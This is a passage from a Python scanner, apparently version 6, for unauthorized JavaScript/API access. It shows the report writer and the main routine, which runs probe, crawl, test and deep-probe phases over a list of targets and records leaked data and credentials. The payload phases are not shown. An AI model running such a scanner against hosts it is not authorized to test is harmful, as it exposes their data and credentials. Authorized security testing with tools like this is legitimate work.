                    if d and isinstance(d, (list,dict)) and not isinstance(d,str):
                        total = parsed.get("total") or (len(d) if isinstance(d,list) else d.get("total"))
                        print(f"  [DEEP] {base_path}{ext} -> total={total}, size={len(body)}")
                        break
                except: pass

def phase5_report(vulnerable, total_scanned):
    print(f"\n[Phase 5] 报告")
    report = {"scan_time":time.strftime("%Y-%m-%d %H:%M:%S"),"total_scanned":total_scanned,
              "vulnerable_count":len(vulnerable),"vulnerable":[]}
    for v in vulnerable:
        report["vulnerable"].append({
            "url":v["base"],"title":v.get("title",""),
            "js_count":v.get("js_count",0),"api_count":len(v.get("apis",[])),
            "pages_crawled":v.get("pages_crawled",0),
            "sensitive_info":v.get("sensitive_info",[]),
            "findings":[{k:fi[k] for k in ["url","method","test","desc","status","data_count","data_keys","total","data_value","data_preview","credential_leak","raw"] if k in fi} for fi in v.get("findings",[])],
        })
    with open(os.path.join(OUTDIR,"deep_report.json"),"w") as f:
        json.dump(report,f,ensure_ascii=False,indent=2,default=str)
    with open(os.path.join(OUTDIR,"deep_report.md"),"w") as f:
        f.write(f"# 深度JS/API未授权访问扫描报告 v6\n\n- 扫描时间:{report['scan_time']}\n- 目标:{report['total_scanned']}\n- 漏洞:{report['vulnerable_count']}\n\n")
        if vulnerable:
            for i,v in enumerate(report["vulnerable"]):
                f.write(f"### [{i+1}] {v['url']} - {v['title']}\n\n")
                f.write(f"- JS:{v['js_count']}, API:{v['api_count']}, 爬取:{v['pages_crawled']}\n")
                for fi in v["findings"][:8]:
                    f.write(f"- `{fi['method']}` {fi.get('url','')}\n")
                    for k in ["data_count","total","data_keys","data_value","credential_leak"]:
                        if k in fi: f.write(f"  - {k}:{str(fi[k])[:200]}\n")
                f.write("\n---\n\n")
    print(f"  报告:{OUTDIR}/deep_report.json, {OUTDIR}/deep_report.md")

# ============= MAIN =============
def main():
    print("="*60)
    print("v6: 两阶段测试 + 路径拼接 + 文件读取探测 + API优先级评分")
    print("="*60)

    with open(INPUT) as f:
        raw = [l.strip() for l in f if l.strip()]
    seen = set(); targets = []
    for t in raw:
        h = t.split("//")[-1].split("/")[0].split(":")[0].strip()
        if h and h not in seen: seen.add(h); targets.append(t)

    print(f"\n[*] {len(targets)} targets")
    start = time.time()
    live = phase1_probe(targets)
    if not live: return
    api_targets = phase2_crawl(live)
    vulnerable = phase3_test(api_targets, live) if live else []
    phase4_deep(vulnerable)
    phase5_report(vulnerable, len(targets))
    elapsed = time.time()-start
    print(f"\n{'='*60}")
    print(f"SCAN COMPLETE: {elapsed:.0f}s | {len(targets)}→{len(live)}→{len(api_targets)}→{len(vulnerable)}")
    print(f"{'='*60}")

if __name__ == "__main__":
    main()
